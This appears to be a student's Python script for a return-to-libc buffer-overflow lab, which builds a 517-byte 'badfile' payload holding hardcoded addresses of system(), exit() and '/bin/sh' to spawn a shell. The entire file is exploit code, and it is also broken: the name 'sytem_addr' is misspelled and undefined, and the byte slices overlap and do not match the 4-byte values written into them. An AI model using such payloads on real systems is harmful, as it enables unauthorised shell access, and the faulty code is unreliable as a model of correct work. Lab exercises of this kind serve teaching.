#!/usr/bin/python3
import sys
#fil the content with non zero value
############################
#you need make changes in mutiple places
content=bytearray(0xaa for i in range(517))

sh_addr=0xbffffdf1 #the adrress of "/bin/sh"
content[40:48]=(sh_addr).to_bytes(4,byteorder='little')
exit_addr=0xb7e369d0 # the exit function address
content[40:44]=(exit_addr).to_bytes(4,byteorder='little')
system_addr=0xb7e42da0 #the address of system()
content[36:44]=(sytem_addr).to_bytes(4,byteorder='little')
with open("badfile",'wb') as f:
    f.write(content)